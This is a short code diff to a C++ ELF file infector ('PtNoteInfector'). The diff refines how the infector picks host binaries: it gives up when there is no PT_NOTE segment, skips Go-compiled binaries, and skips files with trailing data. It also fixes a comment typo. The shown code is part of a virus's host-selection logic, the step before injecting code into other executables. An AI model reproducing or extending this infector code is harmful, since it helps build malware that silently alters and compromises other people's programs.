@@ -93,6 +93,13 @@ bool PtNoteInfector::analyze(std::span<const std::byte> host_mapping,
     // highest vaddress.
   }
 
+  // There is no pt_note. Give up.
+  if (pt_note_to_be_infected_idx_ == 0) {
+    return false;
+  }
+
+  // Check if this is compiled from golang, which relies on the note section to
+  // work. We cannot mutate it.
   auto sht_entry_count = ehdr.e_shnum;
   auto* shdr = reinterpret_cast<const Elf64_Shdr*>(&host_mapping[ehdr.e_shoff]);
   auto shstrtab_idx = ehdr.e_shstrndx;
@@ -103,15 +110,13 @@ bool PtNoteInfector::analyze(std::span<const std::byte> host_mapping,
       const auto* name =
           reinterpret_cast<const char*>(shstrtab + cur_entry->sh_name);
       if (name[6] == 'g' && name[7] == 'o') {
-        // This is a go elf, which relies on the note section to work. We cannot
-        // mutate it.
         printf(STR_LITERAL("cannot infect elf compiled from golang\n"));
         return false;
       }
     }
   }
 
-  // if in the rare case that host is some wierdo, that actually has data at the
+  // if in the rare case that host is some weirdo, that actually has data at the
   // end of the file after section header table, do not infect because it's
   // likely there are other issues preventing it from working. For example, the
   // binary distributed by bazel does this https://github.com/bazelbuild/bazel
